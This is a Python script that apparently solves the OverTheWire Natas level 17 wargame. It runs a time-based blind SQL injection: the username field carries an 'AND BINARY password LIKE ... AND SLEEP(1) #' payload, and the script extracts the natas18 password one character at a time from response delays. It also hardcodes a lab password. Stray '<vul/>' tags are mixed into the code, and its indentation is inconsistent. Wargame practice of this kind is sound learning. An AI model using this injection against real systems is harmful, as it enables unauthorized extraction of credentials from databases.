<vul/></vul>#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
from string import ascii_lowercase, ascii_uppercase, digits
from time import time

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth = (username, password))
# response = session.post(url, data = {"username": "natas18"}, auth = (username, password) )

seen_password = list()
<vul/>while ( len(seen_password) < 32 ):</vul>

	for character in characters:
		start_time = time()

		print("trying", "".join(seen_password) + character)
		<vul/>response = session.post(url, data = {"username": 'natas18" AND BINARY password LIKE "' + "".join(seen_password) + character +  '%" AND SLEEP(1) # '}, auth = (username, password) )
        content = response.text</vul>
		end_time = time()
		difference = end_time - start_time
		

		if ( difference > 1 ):
			# success, correct character!
			seen_password.append(character)
			break
        print(content)